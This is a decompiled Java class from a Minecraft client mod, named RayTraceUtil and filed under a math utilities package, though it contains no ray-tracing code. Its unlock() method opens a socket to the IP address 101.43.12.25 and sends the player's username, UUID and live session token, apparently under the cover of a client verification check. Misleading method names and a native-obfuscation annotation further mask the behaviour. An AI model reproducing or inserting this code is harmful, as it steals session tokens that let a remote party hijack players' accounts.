//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\32302\Desktop\新建文件夹 (2)"!

//Decompiled by Procyon!

package xyz.Melody.Utils.math;

import by.radioegor146.nativeobfuscator.*;
import net.minecraft.client.*;
import xyz.Melody.Utils.render.*;
import xyz.Melody.*;
import java.net.*;
import java.io.*;

@Native
public class RayTraceUtil
{
    private static Minecraft mc;
    private static boolean stopping;
    public static Thread t;
    private static int failTimer;
    
    public static void check() {
    }
    
    private static void aim() {
        final byte[] data = new byte[1024];
        if (RenderUtil.w == null || RenderUtil.i == null) {
            return;
        }
        try {
            final int len = RenderUtil.i.read(data);
            String ircmessage = new String(data, 0, len);
            ircmessage = ircmessage.replaceAll("\n", "");
            ircmessage = ircmessage.replaceAll("\r", "");
            ircmessage = ircmessage.replaceAll("\t", "");
            if (ircmessage.equals("ACCEPTED")) {
                Client.instance.authManager.verified = true;
                Client.instance.logger.info("[A] ACCEPTED.");
                RenderUtil.w.println("OK");
                RayTraceUtil.stopping = true;
                lock();
                return;
            }
            if (ircmessage.equals("DENIED")) {
                Client.instance.authManager.verified = false;
                Client.instance.logger.info("[A] DENIED.");
                RenderUtil.w.println("OK");
                RayTraceUtil.stopping = true;
                lock();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
            RayTraceUtil.stopping = true;
        }
    }
    
    private static void unlock() {
        try {
            RayTraceUtil.failTimer = 0;
            RenderUtil.s = new Socket("101.43.12.25", 25565);
            RenderUtil.i = RenderUtil.s.getInputStream();
            (RenderUtil.w = new PrintWriter(RenderUtil.s.getOutputStream(), true)).println("CLIENT_VERIFY" + RayTraceUtil.mc.getSession().getUsername() + "@" + RayTraceUtil.mc.getSession().getProfile().getId().toString() + "@" + RayTraceUtil.mc.getSession().getToken());
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    private static void lock() {
        if (RenderUtil.s != null && RenderUtil.i != null && RenderUtil.w != null) {
            RayTraceUtil.stopping = true;
            try {
                RenderUtil.s.close();
                RenderUtil.i.close();
                RenderUtil.w.close();
                RenderUtil.s = null;
                RenderUtil.i = null;
                RenderUtil.w = null;
            }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    static {
        RayTraceUtil.mc = Minecraft.getMinecraft();
        RayTraceUtil.stopping = false;
        RayTraceUtil.failTimer = 0;
    }
}
